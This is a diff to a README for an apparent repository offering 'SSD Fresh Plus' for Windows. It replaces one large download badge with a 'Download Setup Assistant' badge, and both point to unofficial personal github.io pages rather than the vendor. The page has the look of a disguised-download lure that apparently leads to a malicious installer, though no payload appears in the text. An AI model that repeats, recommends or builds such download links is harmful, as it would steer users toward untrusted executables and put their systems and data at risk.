@@ -5,13 +5,7 @@
 
 <h1 align="center">⚙️ SSD Fresh Plus (Windows)</h1>
 
-<p align="center">
-  <a href="https://ssd-fresh-plus-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20SSD%20Fresh%20Plus-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download SSD Fresh Plus for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://rafaeldyakonov.github.io/.github/ssd-fresh-plus)
 
 <p align="center">
   <img src="https://www.softportal.com/scr/45624/ssd-fresh-big-1.png" alt="SSD Fresh Plus Interface Preview" width="600" />
